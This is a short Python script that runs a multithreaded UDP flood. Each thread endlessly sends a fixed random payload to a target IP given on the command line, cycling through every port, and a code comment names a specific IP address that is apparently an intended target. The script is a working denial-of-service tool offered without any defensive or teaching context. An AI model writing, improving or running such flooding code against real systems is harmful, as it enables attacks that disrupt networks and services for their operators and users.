import random
import socket
from sys import argv
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random.randint(1,14415151).to_bytes(1441,'big')

def sendLoop(id, ip: str, bytes: bytes):#90.190.103.179
    counter = 0
    port = 1
    while(1):
        counter += 1
        sock.sendto(bytes,(ip, port))
        port += 1
        print(f"[ Thread: {id} ] -- [{port}] -- [{counter}]")
        if(port == 65534):
            port = 1

if __name__ == "__main__":
    ip = argv[1]
    threading_counter = int(argv[2])
    for index in range(threading_counter):
        index += 1
        x = threading.Thread(target=sendLoop, args=(index, ip, bytes))
        print(f'Started {index} thread')
        x.start()
    